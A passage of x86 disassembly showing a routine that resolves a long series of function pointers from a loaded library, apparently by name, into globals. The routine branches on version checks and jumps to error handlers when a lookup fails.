  402eb1:	e8 5a 23 00 00       	call   0x405210
  402eb6:	89 74 24 04          	mov    %esi,0x4(%esp)
  402eba:	89 1c 24             	mov    %ebx,(%esp)
  402ebd:	ff 15 34 f3 41 00    	call   *0x41f334
  402ec3:	81 c4 34 02 00 00    	add    $0x234,%esp
  402ec9:	5b                   	pop    %ebx
  402eca:	5e                   	pop    %esi
  402ecb:	c3                   	ret
  402ecc:	90                   	nop
  402ecd:	90                   	nop
  402ece:	90                   	nop
  402ecf:	90                   	nop
  402ed0:	57                   	push   %edi
  402ed1:	56                   	push   %esi
  402ed2:	53                   	push   %ebx
  402ed3:	83 ec 10             	sub    $0x10,%esp
  402ed6:	8b 1d 58 f2 41 00    	mov    0x41f258,%ebx
  402edc:	8b 74 24 20          	mov    0x20(%esp),%esi
  402ee0:	8b 7c 24 24          	mov    0x24(%esp),%edi
  402ee4:	c7 44 24 04 70 c3 40 	movl   $0x40c370,0x4(%esp)
  402eeb:	00 
  402eec:	89 34 24             	mov    %esi,(%esp)
  402eef:	ff d3                	call   *%ebx
  402ef1:	83 ec 08             	sub    $0x8,%esp
  402ef4:	85 c0                	test   %eax,%eax
  402ef6:	a3 dc 20 41 00       	mov    %eax,0x4120dc
  402efb:	0f 84 00 06 00 00    	je     0x403501
  402f01:	c7 44 24 04 c0 c3 40 	movl   $0x40c3c0,0x4(%esp)
  402f08:	00 
  402f09:	89 34 24             	mov    %esi,(%esp)
  402f0c:	ff d3                	call   *%ebx
  402f0e:	83 ec 08             	sub    $0x8,%esp
  402f11:	85 c0                	test   %eax,%eax
  402f13:	a3 d8 20 41 00       	mov    %eax,0x4120d8
  402f18:	0f 84 f9 05 00 00    	je     0x403517
  402f1e:	c7 44 24 04 18 c4 40 	movl   $0x40c418,0x4(%esp)
  402f25:	00 
  402f26:	89 34 24             	mov    %esi,(%esp)
  402f29:	ff d3                	call   *%ebx
  402f2b:	83 ec 08             	sub    $0x8,%esp
  402f2e:	85 c0                	test   %eax,%eax
  402f30:	a3 d4 20 41 00       	mov    %eax,0x4120d4
  402f35:	0f 84 f2 05 00 00    	je     0x40352d
  402f3b:	c7 44 24 04 51 c4 40 	movl   $0x40c451,0x4(%esp)
  402f42:	00 
  402f43:	89 34 24             	mov    %esi,(%esp)
  402f46:	ff d3                	call   *%ebx
  402f48:	83 ec 08             	sub    $0x8,%esp
  402f4b:	85 c0                	test   %eax,%eax
  402f4d:	a3 d0 20 41 00       	mov    %eax,0x4120d0
  402f52:	0f 84 eb 05 00 00    	je     0x403543
  402f58:	c7 44 24 04 a0 c4 40 	movl   $0x40c4a0,0x4(%esp)
  402f5f:	00 
  402f60:	89 34 24             	mov    %esi,(%esp)
  402f63:	ff d3                	call   *%ebx
  402f65:	83 ec 08             	sub    $0x8,%esp
  402f68:	85 c0                	test   %eax,%eax
  402f6a:	a3 cc 20 41 00       	mov    %eax,0x4120cc
  402f6f:	0f 84 e4 05 00 00    	je     0x403559
  402f75:	c7 44 24 04 d9 c4 40 	movl   $0x40c4d9,0x4(%esp)
  402f7c:	00 
  402f7d:	89 34 24             	mov    %esi,(%esp)
  402f80:	ff d3                	call   *%ebx
  402f82:	83 ec 08             	sub    $0x8,%esp
  402f85:	85 c0                	test   %eax,%eax
  402f87:	a3 c8 20 41 00       	mov    %eax,0x4120c8
  402f8c:	0f 84 dd 05 00 00    	je     0x40356f
  402f92:	c7 44 24 04 22 c5 40 	movl   $0x40c522,0x4(%esp)
  402f99:	00 
  402f9a:	89 34 24             	mov    %esi,(%esp)
  402f9d:	ff d3                	call   *%ebx
  402f9f:	83 ec 08             	sub    $0x8,%esp
  402fa2:	85 c0                	test   %eax,%eax
  402fa4:	a3 c4 20 41 00       	mov    %eax,0x4120c4
  402fa9:	0f 84 d6 05 00 00    	je     0x403585
  402faf:	c7 44 24 04 5f c5 40 	movl   $0x40c55f,0x4(%esp)
  402fb6:	00 
  402fb7:	89 34 24             	mov    %esi,(%esp)
  402fba:	ff d3                	call   *%ebx
  402fbc:	83 ec 08             	sub    $0x8,%esp
  402fbf:	85 c0                	test   %eax,%eax
  402fc1:	a3 c0 20 41 00       	mov    %eax,0x4120c0
  402fc6:	0f 84 cf 05 00 00    	je     0x40359b
  402fcc:	c7 44 24 04 9a c5 40 	movl   $0x40c59a,0x4(%esp)
  402fd3:	00 
  402fd4:	89 34 24             	mov    %esi,(%esp)
  402fd7:	ff d3                	call   *%ebx
  402fd9:	83 ec 08             	sub    $0x8,%esp
  402fdc:	85 c0                	test   %eax,%eax
  402fde:	a3 bc 20 41 00       	mov    %eax,0x4120bc
  402fe3:	0f 84 c8 05 00 00    	je     0x4035b1
  402fe9:	c7 44 24 04 d1 c5 40 	movl   $0x40c5d1,0x4(%esp)
  402ff0:	00 
  402ff1:	89 34 24             	mov    %esi,(%esp)
  402ff4:	ff d3                	call   *%ebx
  402ff6:	83 ec 08             	sub    $0x8,%esp
  402ff9:	85 c0                	test   %eax,%eax
  402ffb:	a3 b8 20 41 00       	mov    %eax,0x4120b8
  403000:	0f 84 c1 05 00 00    	je     0x4035c7
  403006:	c7 44 24 04 01 c6 40 	movl   $0x40c601,0x4(%esp)
  40300d:	00 
  40300e:	89 34 24             	mov    %esi,(%esp)
  403011:	ff d3                	call   *%ebx
  403013:	83 ec 08             	sub    $0x8,%esp
  403016:	85 c0                	test   %eax,%eax
  403018:	a3 b4 20 41 00       	mov    %eax,0x4120b4
  40301d:	0f 84 ba 05 00 00    	je     0x4035dd
  403023:	c7 44 24 04 41 c6 40 	movl   $0x40c641,0x4(%esp)
  40302a:	00 
  40302b:	89 34 24             	mov    %esi,(%esp)
  40302e:	ff d3                	call   *%ebx
  403030:	83 ec 08             	sub    $0x8,%esp
  403033:	85 c0                	test   %eax,%eax
  403035:	a3 b0 20 41 00       	mov    %eax,0x4120b0
  40303a:	0f 84 b3 05 00 00    	je     0x4035f3
  403040:	c7 44 24 04 77 c6 40 	movl   $0x40c677,0x4(%esp)
  403047:	00 
  403048:	89 34 24             	mov    %esi,(%esp)
  40304b:	ff d3                	call   *%ebx
  40304d:	83 ec 08             	sub    $0x8,%esp
  403050:	85 c0                	test   %eax,%eax
  403052:	a3 ac 20 41 00       	mov    %eax,0x4120ac
  403057:	0f 84 ac 05 00 00    	je     0x403609
  40305d:	c7 44 24 04 a9 c6 40 	movl   $0x40c6a9,0x4(%esp)
  403064:	00 
  403065:	89 34 24             	mov    %esi,(%esp)
  403068:	ff d3                	call   *%ebx
  40306a:	83 ec 08             	sub    $0x8,%esp
  40306d:	85 c0                	test   %eax,%eax
  40306f:	a3 a8 20 41 00       	mov    %eax,0x4120a8
  403074:	0f 84 bb 05 00 00    	je     0x403635
  40307a:	c7 44 24 04 e1 c6 40 	movl   $0x40c6e1,0x4(%esp)
  403081:	00 
  403082:	89 34 24             	mov    %esi,(%esp)
  403085:	ff d3                	call   *%ebx
  403087:	83 ec 08             	sub    $0x8,%esp
  40308a:	85 c0                	test   %eax,%eax
  40308c:	a3 a4 20 41 00       	mov    %eax,0x4120a4
  403091:	0f 84 ae 07 00 00    	je     0x403845
  403097:	83 ff 1d             	cmp    $0x1d,%edi
  40309a:	0f 8f f0 02 00 00    	jg     0x403390
  4030a0:	c7 44 24 04 52 c7 40 	movl   $0x40c752,0x4(%esp)
  4030a7:	00 
  4030a8:	89 34 24             	mov    %esi,(%esp)
  4030ab:	ff d3                	call   *%ebx
  4030ad:	83 ec 08             	sub    $0x8,%esp
  4030b0:	85 c0                	test   %eax,%eax
  4030b2:	a3 9c 20 41 00       	mov    %eax,0x41209c
  4030b7:	0f 84 62 05 00 00    	je     0x40361f
  4030bd:	c7 44 24 04 91 c7 40 	movl   $0x40c791,0x4(%esp)
  4030c4:	00 
  4030c5:	89 34 24             	mov    %esi,(%esp)
  4030c8:	ff d3                	call   *%ebx
  4030ca:	83 ec 08             	sub    $0x8,%esp
  4030cd:	85 c0                	test   %eax,%eax
  4030cf:	a3 98 20 41 00       	mov    %eax,0x412098
  4030d4:	0f 84 87 05 00 00    	je     0x403661
  4030da:	c7 44 24 04 d0 c7 40 	movl   $0x40c7d0,0x4(%esp)
  4030e1:	00 
  4030e2:	89 34 24             	mov    %esi,(%esp)
  4030e5:	ff d3                	call   *%ebx
  4030e7:	83 ec 08             	sub    $0x8,%esp
  4030ea:	85 c0                	test   %eax,%eax
  4030ec:	a3 94 20 41 00       	mov    %eax,0x412094
  4030f1:	0f 84 54 05 00 00    	je     0x40364b
  4030f7:	c7 44 24 04 18 c8 40 	movl   $0x40c818,0x4(%esp)
  4030fe:	00 
  4030ff:	89 34 24             	mov    %esi,(%esp)
  403102:	ff d3                	call   *%ebx
  403104:	83 ec 08             	sub    $0x8,%esp
  403107:	85 c0                	test   %eax,%eax
  403109:	a3 90 20 41 00       	mov    %eax,0x412090
  40310e:	0f 84 79 05 00 00    	je     0x40368d
  403114:	c7 44 24 04 4b c8 40 	movl   $0x40c84b,0x4(%esp)
  40311b:	00 
  40311c:	89 34 24             	mov    %esi,(%esp)
  40311f:	ff d3                	call   *%ebx
  403121:	83 ec 08             	sub    $0x8,%esp
  403124:	85 c0                	test   %eax,%eax
  403126:	a3 8c 20 41 00       	mov    %eax,0x41208c
  40312b:	0f 84 46 05 00 00    	je     0x403677
  403131:	c7 44 24 04 86 c8 40 	movl   $0x40c886,0x4(%esp)
  403138:	00 
  403139:	89 34 24             	mov    %esi,(%esp)
  40313c:	ff d3                	call   *%ebx
  40313e:	83 ec 08             	sub    $0x8,%esp
  403141:	85 c0                	test   %eax,%eax
  403143:	a3 88 20 41 00       	mov    %eax,0x412088
  403148:	0f 84 6b 05 00 00    	je     0x4036b9
  40314e:	c7 44 24 04 bb c8 40 	movl   $0x40c8bb,0x4(%esp)
  403155:	00 
  403156:	89 34 24             	mov    %esi,(%esp)
  403159:	ff d3                	call   *%ebx
  40315b:	83 ec 08             	sub    $0x8,%esp
  40315e:	85 c0                	test   %eax,%eax
  403160:	a3 84 20 41 00       	mov    %eax,0x412084
  403165:	0f 84 38 05 00 00    	je     0x4036a3
  40316b:	c7 44 24 04 00 c9 40 	movl   $0x40c900,0x4(%esp)
  403172:	00 
  403173:	89 34 24             	mov    %esi,(%esp)
  403176:	ff d3                	call   *%ebx
  403178:	83 ec 08             	sub    $0x8,%esp
  40317b:	85 c0                	test   %eax,%eax
  40317d:	a3 80 20 41 00       	mov    %eax,0x412080
  403182:	0f 84 5d 05 00 00    	je     0x4036e5
  403188:	c7 44 24 04 42 c9 40 	movl   $0x40c942,0x4(%esp)
  40318f:	00 
  403190:	89 34 24             	mov    %esi,(%esp)
  403193:	ff d3                	call   *%ebx
  403195:	83 ec 08             	sub    $0x8,%esp
  403198:	85 c0                	test   %eax,%eax
  40319a:	a3 7c 20 41 00       	mov    %eax,0x41207c
  40319f:	0f 84 2a 05 00 00    	je     0x4036cf
  4031a5:	c7 44 24 04 88 c9 40 	movl   $0x40c988,0x4(%esp)
  4031ac:	00 
  4031ad:	89 34 24             	mov    %esi,(%esp)
  4031b0:	ff d3                	call   *%ebx
  4031b2:	83 ec 08             	sub    $0x8,%esp
  4031b5:	85 c0                	test   %eax,%eax
  4031b7:	a3 78 20 41 00       	mov    %eax,0x412078
  4031bc:	0f 84 65 05 00 00    	je     0x403727
  4031c2:	c7 44 24 04 ca c9 40 	movl   $0x40c9ca,0x4(%esp)
  4031c9:	00 
  4031ca:	89 34 24             	mov    %esi,(%esp)
  4031cd:	ff d3                	call   *%ebx
  4031cf:	83 ec 08             	sub    $0x8,%esp
  4031d2:	85 c0                	test   %eax,%eax
  4031d4:	a3 74 20 41 00       	mov    %eax,0x412074
  4031d9:	0f 84 32 05 00 00    	je     0x403711
  4031df:	c7 44 24 04 17 ca 40 	movl   $0x40ca17,0x4(%esp)
  4031e6:	00 
  4031e7:	89 34 24             	mov    %esi,(%esp)
  4031ea:	ff d3                	call   *%ebx
  4031ec:	83 ec 08             	sub    $0x8,%esp
  4031ef:	85 c0                	test   %eax,%eax
  4031f1:	a3 70 20 41 00       	mov    %eax,0x412070
  4031f6:	0f 84 ff 04 00 00    	je     0x4036fb
  4031fc:	c7 44 24 04 61 ca 40 	movl   $0x40ca61,0x4(%esp)
  403203:	00 
  403204:	89 34 24             	mov    %esi,(%esp)
  403207:	ff d3                	call   *%ebx
  403209:	83 ec 08             	sub    $0x8,%esp
  40320c:	85 c0                	test   %eax,%eax
  40320e:	a3 6c 20 41 00       	mov    %eax,0x41206c
  403213:	0f 84 24 05 00 00    	je     0x40373d
  403219:	c7 44 24 04 99 ca 40 	movl   $0x40ca99,0x4(%esp)
  403220:	00 
  403221:	89 34 24             	mov    %esi,(%esp)
  403224:	ff d3                	call   *%ebx
  403226:	83 ec 08             	sub    $0x8,%esp
  403229:	85 c0                	test   %eax,%eax
  40322b:	a3 68 20 41 00       	mov    %eax,0x412068
  403230:	0f 84 1d 05 00 00    	je     0x403753
  403236:	c7 44 24 04 ca ca 40 	movl   $0x40caca,0x4(%esp)
  40323d:	00 
  40323e:	89 34 24             	mov    %esi,(%esp)
  403241:	ff d3                	call   *%ebx
  403243:	83 ec 08             	sub    $0x8,%esp
  403246:	85 c0                	test   %eax,%eax
  403248:	a3 64 20 41 00       	mov    %eax,0x412064
  40324d:	0f 84 16 05 00 00    	je     0x403769
  403253:	c7 44 24 04 01 cb 40 	movl   $0x40cb01,0x4(%esp)
  40325a:	00 
  40325b:	89 34 24             	mov    %esi,(%esp)
  40325e:	ff d3                	call   *%ebx
  403260:	83 ec 08             	sub    $0x8,%esp
  403263:	85 c0                	test   %eax,%eax
  403265:	a3 60 20 41 00       	mov    %eax,0x412060
  40326a:	0f 84 0f 05 00 00    	je     0x40377f
  403270:	c7 44 24 04 40 cb 40 	movl   $0x40cb40,0x4(%esp)
  403277:	00 
  403278:	89 34 24             	mov    %esi,(%esp)
  40327b:	ff d3                	call   *%ebx
  40327d:	83 ec 08             	sub    $0x8,%esp
  403280:	85 c0                	test   %eax,%eax
  403282:	a3 5c 20 41 00       	mov    %eax,0x41205c
  403287:	0f 84 08 05 00 00    	je     0x403795
  40328d:	c7 44 24 04 89 cb 40 	movl   $0x40cb89,0x4(%esp)
  403294:	00 
  403295:	89 34 24             	mov    %esi,(%esp)
  403298:	ff d3                	call   *%ebx
  40329a:	83 ec 08             	sub    $0x8,%esp
  40329d:	85 c0                	test   %eax,%eax
  40329f:	a3 58 20 41 00       	mov    %eax,0x412058
  4032a4:	0f 84 01 05 00 00    	je     0x4037ab
  4032aa:	c7 44 24 04 d2 cb 40 	movl   $0x40cbd2,0x4(%esp)
  4032b1:	00 
  4032b2:	89 34 24             	mov    %esi,(%esp)
  4032b5:	ff d3                	call   *%ebx
  4032b7:	83 ec 08             	sub    $0x8,%esp
  4032ba:	85 c0                	test   %eax,%eax
  4032bc:	a3 54 20 41 00       	mov    %eax,0x412054
  4032c1:	0f 84 94 05 00 00    	je     0x40385b
  4032c7:	83 ff 1d             	cmp    $0x1d,%edi
  4032ca:	0f 8e f0 00 00 00    	jle    0x4033c0
  4032d0:	c7 44 24 04 9f cc 40 	movl   $0x40cc9f,0x4(%esp)
  4032d7:	00 
  4032d8:	89 34 24             	mov    %esi,(%esp)
  4032db:	ff d3                	call   *%ebx
  4032dd:	83 ec 08             	sub    $0x8,%esp
  4032e0:	85 c0                	test   %eax,%eax
  4032e2:	a3 4c 20 41 00       	mov    %eax,0x41204c
  4032e7:	0f 84 d4 04 00 00    	je     0x4037c1
  4032ed:	c7 44 24 04 e3 cc 40 	movl   $0x40cce3,0x4(%esp)
  4032f4:	00 
  4032f5:	89 34 24             	mov    %esi,(%esp)
  4032f8:	ff d3                	call   *%ebx
  4032fa:	83 ec 08             	sub    $0x8,%esp
  4032fd:	85 c0                	test   %eax,%eax
  4032ff:	a3 48 20 41 00       	mov    %eax,0x412048
  403304:	0f 84 cd 04 00 00    	je     0x4037d7
  40330a:	c7 44 24 04 1f cd 40 	movl   $0x40cd1f,0x4(%esp)
  403311:	00 
  403312:	89 34 24             	mov    %esi,(%esp)
  403315:	ff d3                	call   *%ebx
  403317:	83 ec 08             	sub    $0x8,%esp
  40331a:	85 c0                	test   %eax,%eax
  40331c:	a3 44 20 41 00       	mov    %eax,0x412044
  403321:	0f 84 c6 04 00 00    	je     0x4037ed
  403327:	c7 44 24 04 5b cd 40 	movl   $0x40cd5b,0x4(%esp)
  40332e:	00 
  40332f:	89 34 24             	mov    %esi,(%esp)
  403332:	ff d3                	call   *%ebx
  403334:	83 ec 08             	sub    $0x8,%esp
  403337:	85 c0                	test   %eax,%eax
  403339:	a3 40 20 41 00       	mov    %eax,0x412040
  40333e:	0f 84 bf 04 00 00    	je     0x403803
  403344:	c7 44 24 04 97 cd 40 	movl   $0x40cd97,0x4(%esp)
  40334b:	00 
  40334c:	89 34 24             	mov    %esi,(%esp)
  40334f:	ff d3                	call   *%ebx
  403351:	83 ec 08             	sub    $0x8,%esp
  403354:	85 c0                	test   %eax,%eax
  403356:	a3 3c 20 41 00       	mov    %eax,0x41203c
  40335b:	0f 84 b8 04 00 00    	je     0x403819
  403361:	c7 44 24 04 d1 cd 40 	movl   $0x40cdd1,0x4(%esp)
  403368:	00 
  403369:	89 34 24             	mov    %esi,(%esp)
  40336c:	ff d3                	call   *%ebx
  40336e:	83 ec 08             	sub    $0x8,%esp
  403371:	85 c0                	test   %eax,%eax
  403373:	a3 38 20 41 00       	mov    %eax,0x412038
  403378:	0f 84 f3 04 00 00    	je     0x403871
  40337e:	83 ff 1d             	cmp    $0x1d,%edi
  403381:	0f 8f 89 00 00 00    	jg     0x403410
  403387:	31 c0                	xor    %eax,%eax
  403389:	83 c4 10             	add    $0x10,%esp
  40338c:	5b                   	pop    %ebx
  40338d:	5e                   	pop    %esi
  40338e:	5f                   	pop    %edi
  40338f:	c3                   	ret
  403390:	c7 44 24 04 21 c7 40 	movl   $0x40c721,0x4(%esp)
  403397:	00 
  403398:	89 34 24             	mov    %esi,(%esp)
  40339b:	ff d3                	call   *%ebx
  40339d:	83 ec 08             	sub    $0x8,%esp
  4033a0:	85 c0                	test   %eax,%eax
  4033a2:	a3 a0 20 41 00       	mov    %eax,0x4120a0
  4033a7:	0f 85 f3 fc ff ff    	jne    0x4030a0
  4033ad:	c7 04 24 2c c7 40 00 	movl   $0x40c72c,(%esp)
  4033b4:	e8 57 ea ff ff       	call   0x401e10
  4033b9:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4033be:	eb c9                	jmp    0x403389
  4033c0:	c7 44 24 04 16 cc 40 	movl   $0x40cc16,0x4(%esp)
  4033c7:	00 
  4033c8:	89 34 24             	mov    %esi,(%esp)
  4033cb:	ff d3                	call   *%ebx
  4033cd:	83 ec 08             	sub    $0x8,%esp
  4033d0:	85 c0                	test   %eax,%eax
  4033d2:	a3 50 20 41 00       	mov    %eax,0x412050
  4033d7:	0f 84 52 04 00 00    	je     0x40382f
  4033dd:	c7 44 24 04 5b cc 40 	movl   $0x40cc5b,0x4(%esp)
  4033e4:	00 
  4033e5:	89 34 24             	mov    %esi,(%esp)
  4033e8:	ff d3                	call   *%ebx
  4033ea:	83 ec 08             	sub    $0x8,%esp
  4033ed:	85 c0                	test   %eax,%eax
  4033ef:	a3 2c 20 41 00       	mov    %eax,0x41202c
  4033f4:	0f 85 d6 fe ff ff    	jne    0x4032d0
  4033fa:	c7 04 24 70 cc 40 00 	movl   $0x40cc70,(%esp)
  403401:	e8 0a ea ff ff       	call   0x401e10
  403406:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40340b:	e9 79 ff ff ff       	jmp    0x403389
  403410:	c7 44 24 04 12 ce 40 	movl   $0x40ce12,0x4(%esp)
  403417:	00 
  403418:	89 34 24             	mov    %esi,(%esp)
  40341b:	ff d3                	call   *%ebx
  40341d:	83 ec 08             	sub    $0x8,%esp
  403420:	85 c0                	test   %eax,%eax
  403422:	a3 34 20 41 00       	mov    %eax,0x412034
  403427:	0f 84 70 04 00 00    	je     0x40389d
  40342d:	83 ff 22             	cmp    $0x22,%edi
  403430:	0f 8f 9a 00 00 00    	jg     0x4034d0
  403436:	c7 44 24 04 93 ce 40 	movl   $0x40ce93,0x4(%esp)
  40343d:	00 
  40343e:	89 34 24             	mov    %esi,(%esp)
  403441:	ff d3                	call   *%ebx
  403443:	83 ec 08             	sub    $0x8,%esp
  403446:	85 c0                	test   %eax,%eax
  403448:	a3 30 20 41 00       	mov    %eax,0x412030
  40344d:	0f 84 72 04 00 00    	je     0x4038c5
  403453:	c7 44 24 04 91 cf 40 	movl   $0x40cf91,0x4(%esp)
  40345a:	00 
  40345b:	89 34 24             	mov    %esi,(%esp)
  40345e:	ff d3                	call   *%ebx
  403460:	83 ec 08             	sub    $0x8,%esp
  403463:	85 c0                	test   %eax,%eax
  403465:	a3 28 20 41 00       	mov    %eax,0x412028
  40346a:	0f 84 17 04 00 00    	je     0x403887
  403470:	c7 44 24 04 00 cf 40 	movl   $0x40cf00,0x4(%esp)
  403477:	00 
  403478:	89 34 24             	mov    %esi,(%esp)
  40347b:	ff d3                	call   *%ebx
  40347d:	83 ec 08             	sub    $0x8,%esp
  403480:	85 c0                	test   %eax,%eax
  403482:	a3 20 20 41 00       	mov    %eax,0x412020
  403487:	0f 84 24 04 00 00    	je     0x4038b1
  40348d:	83 ff 1f             	cmp    $0x1f,%edi
  403490:	0f 8e f1 fe ff ff    	jle    0x403387
  403496:	c7 44 24 04 40 cf 40 	movl   $0x40cf40,0x4(%esp)
  40349d:	00 
  40349e:	89 34 24             	mov    %esi,(%esp)
  4034a1:	ff d3                	call   *%ebx
  4034a3:	83 ec 08             	sub    $0x8,%esp
  4034a6:	85 c0                	test   %eax,%eax
  4034a8:	a3 24 20 41 00       	mov    %eax,0x412024
  4034ad:	0f 85 d4 fe ff ff    	jne    0x403387
  4034b3:	c7 04 24 5c cf 40 00 	movl   $0x40cf5c,(%esp)
  4034ba:	e8 51 e9 ff ff       	call   0x401e10
  4034bf:	83 c8 ff             	or     $0xffffffff,%eax
  4034c2:	e9 c2 fe ff ff       	jmp    0x403389
  4034c7:	89 f6                	mov    %esi,%esi
  4034c9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  4034d0:	c7 44 24 04 58 ce 40 	movl   $0x40ce58,0x4(%esp)
  4034d7:	00 
  4034d8:	89 34 24             	mov    %esi,(%esp)
  4034db:	ff d3                	call   *%ebx
  4034dd:	83 ec 08             	sub    $0x8,%esp
  4034e0:	85 c0                	test   %eax,%eax
  4034e2:	a3 30 20 41 00       	mov    %eax,0x412030
  4034e7:	0f 85 66 ff ff ff    	jne    0x403453
  4034ed:	c7 04 24 68 ce 40 00 	movl   $0x40ce68,(%esp)
  4034f4:	e8 17 e9 ff ff       	call   0x401e10
  4034f9:	83 c8 ff             	or     $0xffffffff,%eax
  4034fc:	e9 88 fe ff ff       	jmp    0x403389
  403501:	c7 04 24 8c c3 40 00 	movl   $0x40c38c,(%esp)
  403508:	e8 03 e9 ff ff       	call   0x401e10
  40350d:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  403512:	e9 72 fe ff ff       	jmp    0x403389
  403517:	c7 04 24 e0 c3 40 00 	movl   $0x40c3e0,(%esp)
  40351e:	e8 ed e8 ff ff       	call   0x401e10
  403523:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  403528:	e9 5c fe ff ff       	jmp    0x403389
  40352d:	c7 04 24 28 c4 40 00 	movl   $0x40c428,(%esp)
  403534:	e8 d7 e8 ff ff       	call   0x401e10
  403539:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40353e:	e9 46 fe ff ff       	jmp    0x403389
  403543:	c7 04 24 6c c4 40 00 	movl   $0x40c46c,(%esp)
  40354a:	e8 c1 e8 ff ff       	call   0x401e10
  40354f:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  403554:	e9 30 fe ff ff       	jmp    0x403389
  403559:	c7 04 24 b0 c4 40 00 	movl   $0x40c4b0,(%esp)
  403560:	e8 ab e8 ff ff       	call   0x401e10
  403565:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40356a:	e9 1a fe ff ff       	jmp    0x403389
  40356f:	c7 04 24 f0 c4 40 00 	movl   $0x40c4f0,(%esp)
  403576:	e8 95 e8 ff ff       	call   0x401e10
  40357b:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  403580:	e9 04 fe ff ff       	jmp    0x403389
  403585:	c7 04 24 34 c5 40 00 	movl   $0x40c534,(%esp)
  40358c:	e8 7f e8 ff ff       	call   0x401e10
  403591:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  403596:	e9 ee fd ff ff       	jmp    0x403389
  40359b:	c7 04 24 70 c5 40 00 	movl   $0x40c570,(%esp)
  4035a2:	e8 69 e8 ff ff       	call   0x401e10
  4035a7:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4035ac:	e9 d8 fd ff ff       	jmp    0x403389
  4035b1:	c7 04 24 a8 c5 40 00 	movl   $0x40c5a8,(%esp)
  4035b8:	e8 53 e8 ff ff       	call   0x401e10
  4035bd:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4035c2:	e9 c2 fd ff ff       	jmp    0x403389
  4035c7:	c7 04 24 dc c5 40 00 	movl   $0x40c5dc,(%esp)
  4035ce:	e8 3d e8 ff ff       	call   0x401e10
  4035d3:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4035d8:	e9 ac fd ff ff       	jmp    0x403389
  4035dd:	c7 04 24 14 c6 40 00 	movl   $0x40c614,(%esp)
  4035e4:	e8 27 e8 ff ff       	call   0x401e10
  4035e9:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4035ee:	e9 96 fd ff ff       	jmp    0x403389
  4035f3:	c7 04 24 50 c6 40 00 	movl   $0x40c650,(%esp)
  4035fa:	e8 11 e8 ff ff       	call   0x401e10
  4035ff:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  403604:	e9 80 fd ff ff       	jmp    0x403389
  403609:	c7 04 24 84 c6 40 00 	movl   $0x40c684,(%esp)
  403610:	e8 fb e7 ff ff       	call   0x401e10
  403615:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40361a:	e9 6a fd ff ff       	jmp    0x403389
  40361f:	c7 04 24 64 c7 40 00 	movl   $0x40c764,(%esp)
  403626:	e8 e5 e7 ff ff       	call   0x401e10
  40362b:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  403630:	e9 54 fd ff ff       	jmp    0x403389
  403635:	c7 04 24 b8 c6 40 00 	movl   $0x40c6b8,(%esp)
  40363c:	e8 cf e7 ff ff       	call   0x401e10
  403641:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  403646:	e9 3e fd ff ff       	jmp    0x403389
  40364b:	c7 04 24 e8 c7 40 00 	movl   $0x40c7e8,(%esp)
  403652:	e8 b9 e7 ff ff       	call   0x401e10
  403657:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40365c:	e9 28 fd ff ff       	jmp    0x403389
  403661:	c7 04 24 a4 c7 40 00 	movl   $0x40c7a4,(%esp)
  403668:	e8 a3 e7 ff ff       	call   0x401e10
  40366d:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  403672:	e9 12 fd ff ff       	jmp    0x403389
  403677:	c7 04 24 5c c8 40 00 	movl   $0x40c85c,(%esp)
  40367e:	e8 8d e7 ff ff       	call   0x401e10
  403683:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  403688:	e9 fc fc ff ff       	jmp    0x403389
  40368d:	c7 04 24 24 c8 40 00 	movl   $0x40c824,(%esp)
  403694:	e8 77 e7 ff ff       	call   0x401e10
  403699:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40369e:	e9 e6 fc ff ff       	jmp    0x403389
  4036a3:	c7 04 24 d0 c8 40 00 	movl   $0x40c8d0,(%esp)
  4036aa:	e8 61 e7 ff ff       	call   0x401e10
  4036af:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4036b4:	e9 d0 fc ff ff       	jmp    0x403389
  4036b9:	c7 04 24 94 c8 40 00 	movl   $0x40c894,(%esp)
  4036c0:	e8 4b e7 ff ff       	call   0x401e10
  4036c5:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4036ca:	e9 ba fc ff ff       	jmp    0x403389
  4036cf:	c7 04 24 58 c9 40 00 	movl   $0x40c958,(%esp)
  4036d6:	e8 35 e7 ff ff       	call   0x401e10
  4036db:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4036e0:	e9 a4 fc ff ff       	jmp    0x403389
  4036e5:	c7 04 24 14 c9 40 00 	movl   $0x40c914,(%esp)
  4036ec:	e8 1f e7 ff ff       	call   0x401e10
  4036f1:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4036f6:	e9 8e fc ff ff       	jmp    0x403389
  4036fb:	c7 04 24 30 ca 40 00 	movl   $0x40ca30,(%esp)
  403702:	e8 09 e7 ff ff       	call   0x401e10
  403707:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40370c:	e9 78 fc ff ff       	jmp    0x403389
  403711:	c7 04 24 e4 c9 40 00 	movl   $0x40c9e4,(%esp)
  403718:	e8 f3 e6 ff ff       	call   0x401e10
  40371d:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  403722:	e9 62 fc ff ff       	jmp    0x403389
  403727:	c7 04 24 9c c9 40 00 	movl   $0x40c99c,(%esp)
  40372e:	e8 dd e6 ff ff       	call   0x401e10
  403733:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  403738:	e9 4c fc ff ff       	jmp    0x403389
  40373d:	c7 04 24 70 ca 40 00 	movl   $0x40ca70,(%esp)
